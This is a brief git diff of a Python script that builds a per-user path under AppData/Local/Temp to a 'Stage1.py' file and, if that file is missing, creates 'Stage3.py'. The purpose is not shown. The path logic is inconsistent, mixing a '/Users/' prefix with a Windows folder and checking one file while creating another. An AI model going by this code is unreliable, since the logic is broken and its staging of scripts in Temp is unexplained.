@@ -4,7 +4,7 @@ from bs4 import BeautifulSoup
 
 x = os.getlogin()
 
-path = os.path.join("AppData/Local/Temp/Stage3.py")
+path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/Stage1.py")
 
 if os.path.isfile(path) == False:
     file = open('Stage3.py', 'a')
